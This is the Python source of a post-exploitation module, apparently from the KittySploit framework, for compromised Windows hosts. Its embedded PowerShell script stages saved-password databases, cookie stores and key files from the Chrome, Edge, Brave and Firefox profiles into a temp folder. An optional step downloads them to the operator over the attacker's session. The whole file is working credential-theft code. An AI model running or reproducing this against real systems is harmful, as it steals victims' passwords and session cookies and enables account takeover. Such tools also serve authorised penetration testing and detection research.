#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import time

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Gather Browser Credential Extract",
        "description": "Stage Chromium/Firefox Login Data and Cookies to temp",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1555.003/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_access"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.1,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": ["credentials"],
            },
        },
    }

    browser = OptChoice(
        "all",
        "Browser to target: all, chrome, edge, brave, firefox",
        False,
        choices=["all", "chrome", "edge", "brave", "firefox"],
    )
    download = OptBool(False, "Download staged artifacts to the operator machine", False)
    local_dir = OptString("output/browser_creds", "Local directory for downloaded artifacts", False)

    def _extract_script(self) -> str:
        browser = str(self.browser or "all").strip().lower()
        stamp = int(time.time())
        return rf"""
$ErrorActionPreference = 'SilentlyContinue'
$targetBrowser = '{browser}'
$stagingRoot = Join-Path $env:TEMP ('ks_browser_' + '{stamp}')

function Copy-Artifact($browserName, $profileName, $src, $label) {{
    if (-not (Test-Path -LiteralPath $src)) {{
        return [PSCustomObject]@{{
            Browser = $browserName
            Profile = $profileName
            Label = $label
            Source = $src
            Copied = $false
            Error = 'missing'
        }}
    }}
    $destDir = Join-Path $stagingRoot ($browserName + '\' + $profileName)
    New-Item -ItemType Directory -Path $destDir -Force | Out-Null
    $dest = Join-Path $destDir ($label + '-' + (Split-Path $src -Leaf))
    try {{
        Copy-Item -LiteralPath $src -Destination $dest -Force -ErrorAction Stop
        $item = Get-Item -LiteralPath $dest
        return [PSCustomObject]@{{
            Browser = $browserName
            Profile = $profileName
            Label = $label
            Source = $src
            StagedPath = $dest
            Size = $item.Length
            Copied = $true
            Error = $null
        }}
    }} catch {{
        return [PSCustomObject]@{{
            Browser = $browserName
            Profile = $profileName
            Label = $label
            Source = $src
            Copied = $false
            Error = $_.Exception.Message
        }}
    }}
}}

function Stage-Chromium($name, $userDataRoot) {{
    $results = @()
    if (-not (Test-Path -LiteralPath $userDataRoot)) {{ return $results }}
    $localState = Join-Path $userDataRoot 'Local State'
    $results += Copy-Artifact $name 'root' $localState 'local-state'
    Get-ChildItem -LiteralPath $userDataRoot -Directory -ErrorAction SilentlyContinue |
        Where-Object {{ $_.Name -match '^(Default|Profile \d+)$' }} |
        ForEach-Object {{
            $base = $_.FullName
            $prof = $_.Name
            foreach ($pair in @(
                @{{ Label = 'login-data'; File = 'Login Data' }},
                @{{ Label = 'cookies'; File = 'Cookies' }},
                @{{ Label = 'web-data'; File = 'Web Data' }}
            )) {{
                $results += Copy-Artifact $name $prof (Join-Path $base $pair.File) $pair.Label
            }}
        }}
    return $results
}}

$local = $env:LOCALAPPDATA
$roaming = $env:APPDATA
$targets = @()
if ($targetBrowser -in @('all','chrome')) {{
    $targets += @{{ Name='Chrome'; Path=(Join-Path $local 'Google\Chrome\User Data') }}
}}
if ($targetBrowser -in @('all','edge')) {{
    $targets += @{{ Name='Edge'; Path=(Join-Path $local 'Microsoft\Edge\User Data') }}
}}
if ($targetBrowser -in @('all','brave')) {{
    $targets += @{{ Name='Brave'; Path=(Join-Path $local 'BraveSoftware\Brave-Browser\User Data') }}
}}

$artifacts = @()
foreach ($t in $targets) {{
    $artifacts += Stage-Chromium $t.Name $t.Path
}}

if ($targetBrowser -in @('all','firefox')) {{
    $ini = Join-Path $roaming 'Mozilla\Firefox\profiles.ini'
    if (Test-Path -LiteralPath $ini) {{
        $root = Split-Path -Parent $ini
        $lines = Get-Content -LiteralPath $ini
        $current = @{{}}
        $sections = @()
        foreach ($line in $lines) {{
            if ($line -match '^\[(.+)\]$') {{
                if ($current.Count -gt 0) {{ $sections += [PSCustomObject]$current }}
                $current = @{{ Section = $matches[1] }}
            }} elseif ($line -match '^([^=]+)=(.*)$') {{
                $current[$matches[1].Trim()] = $matches[2].Trim()
            }}
        }}
        if ($current.Count -gt 0) {{ $sections += [PSCustomObject]$current }}
        foreach ($sec in ($sections | Where-Object {{ $_.Section -like 'Profile*' }})) {{
            $rel = $sec.Path
            if (-not $rel) {{ continue }}
            $base = if ([IO.Path]::IsPathRooted($rel)) {{ $rel }} else {{ Join-Path $root $rel }}
            $profileName = if ($sec.Name) {{ $sec.Name }} else {{ $sec.Section }}
            foreach ($pair in @(
                @{{ Label='logins-json'; File='logins.json' }},
                @{{ Label='key4db'; File='key4.db' }},
                @{{ Label='cookies'; File='cookies.sqlite' }}
            )) {{
                $artifacts += Copy-Artifact 'Firefox' $profileName (Join-Path $base $pair.File) $pair.Label
            }}
        }}
    }}
}}

[PSCustomObject]@{{
    StagingRoot = $stagingRoot
    Artifacts = $artifacts
    CopiedCount = @($artifacts | Where-Object {{ $_.Copied }}).Count
    FailedCount = @($artifacts | Where-Object {{ -not $_.Copied }}).Count
}} | ConvertTo-Json -Depth 8 -Compress
"""

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        print_info("=" * 60)
        print_warning("Staging browser credential databases (DPAPI-protected)")

        raw = self.win_run_powershell(self._extract_script(), timeout=50)
        if not raw:
            print_warning("Extractor returned no output")
            return False

        try:
            data = json.loads(raw.strip().splitlines()[-1])
        except Exception as exc:
            print_error(f"Failed to parse extract output: {exc}")
            print_info(raw[:2500])
            return False

        staging = data.get("StagingRoot", "")
        artifacts = data.get("Artifacts") or []
        copied = data.get("CopiedCount", 0)
        failed = data.get("FailedCount", 0)

        print_info(f"Staging root: {staging}")
        print_success(f"Copied {copied} artifact(s), {failed} failure(s)")

        for item in artifacts:
            if item.get("Copied"):
                print_success(
                    f"  [{item.get('Browser', '?')}/{item.get('Profile', '?')}] "
                    f"{item.get('Label', '?')} -> {item.get('StagedPath', '')} "
                    f"({item.get('Size', 0)} bytes)"
                )
            else:
                print_warning(
                    f"  [{item.get('Browser', '?')}/{item.get('Profile', '?')}] "
                    f"{item.get('Label', '?')} failed: {item.get('Error', 'unknown')} "
                    f"(browser may be locking files)"
                )

        if failed and copied == 0:
            print_error("No artifacts copied — close target browsers or retry from another session")
            return False

        if self.download:
            local_base = str(self.local_dir or "output/browser_creds").strip()
            os.makedirs(local_base, exist_ok=True)
            pulled = 0
            for item in artifacts:
                if not item.get("Copied"):
                    continue
                remote = item.get("StagedPath", "")
                if not remote:
                    continue
                rel = f"{item.get('Browser', 'browser')}_{item.get('Profile', 'profile')}_{item.get('Label', 'artifact')}"
                local_path = os.path.join(local_base, f"{rel}_{os.path.basename(remote)}")
                print_status(f"Downloading {remote} ...")
                if self.win_pull_file_via_session(remote, local_path):
                    pulled += 1
                    print_success(f"  Saved to {local_path}")
            print_info(f"Downloaded {pulled} file(s) to {local_base}")

        print_info("=" * 60)
        return copied > 0
